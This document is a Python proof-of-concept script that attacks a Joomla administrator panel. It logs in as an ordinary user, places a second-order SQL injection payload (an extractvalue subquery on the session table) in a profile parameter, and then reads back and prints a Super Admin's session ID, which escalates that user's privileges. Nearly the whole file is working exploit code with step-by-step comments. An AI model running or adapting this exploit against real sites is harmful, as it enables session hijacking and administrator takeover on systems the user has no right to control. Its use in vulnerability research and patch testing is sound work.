from requests import Session
from bs4 import BeautifulSoup as bs
import re


#url is the home page of Joomla!
#url will change based on the name of your instance (the name of mine is Joomla!)
url = "http://localhost/Joomla!/administrator/index.php"

#url2 is the url of the edit account page within Joomla!
#this will most likely change due to different user IDs and the name of your instance
url2 = "http://localhost/Joomla!/administrator/index.php?option=com_admin&view=profile&layout=edit&id=182"

#the user and passwd variables are known information of the user who is trying to escalate privleges
user = "Test"
passwd = "Test"

#these are used with profile_data
name = "Test"
userEmail = "test@test.com"

#this definition 'soupifies' the login page
def requestAndSoupify(url):
	page = s.get(url)
	soup = bs(page.content, "html.parser")
	return soup

#the loop used to get the session ID of the Super Admin
with Session() as s:
    #this is requesting the 'soupified' login page
    login_page = requestAndSoupify(url)
    
    #the returnToken and csrfToken changes so this finds the value of them
    returnToken = login_page.find("input", {"name": "return"})["value"]
    csrfToken = login_page.find("input", {"value":"1"})["name"]
    
    #The data that is used for the input of the login page
    #The returnToken, csrfToken, user, and passwd are being pulled from the variables above
    login_data = {
        "username":user,
        "passwd":passwd,
        "option":"com_login",
        "task":"login",
        "return":returnToken,
        csrfToken:"1"
        }
    response = s.post(url, login_data)
    
    #this is requesting the 'soupified' Edit Account page
    profile_page = requestAndSoupify(url2)

    #python is automatically finding these values so you don't have to manually find them and input them
    csrfToken = profile_page.find("input", {"value":"1"})["name"]
    regDate = profile_page.find("input",{"name":"jform[registerDate]"})["value"]
    lastVisit = profile_page.find("input",{"name":"jform[lastvisitDate]"})["value"]
    userID = profile_page.find("input",{"name":"jform[id]"})["value"]
    
    #these parameters are used to update the profile. Their values are being pulled from the variables right above
    profile_data = {
        "jform[name]":name,
        "jform[username]":user,
        "jform[email]":userEmail,
        "jform[registerDate]":regDate,
        "jform[lastvisitDate]":lastVisit,
        "jform[id]":userID,
        #This is the affected paramter with the injection
        "jform[params][admin_style][0]":"extractvalue(0x0a,concat(0x0a,(select session_id from evxsh_session where username = 'TestSuper')))",
        "task":"profile.apply",
        csrfToken:"1"
        }
    s.post(url2, profile_data)
    
    #This is extraxting the session token by initiating the Second Order Injection by going back to the home page
    admin_page = requestAndSoupify(url)
    sessionID = admin_page.find('div', class_ ="alert-message")
    

    #this prints the session token
    print(sessionID.text)
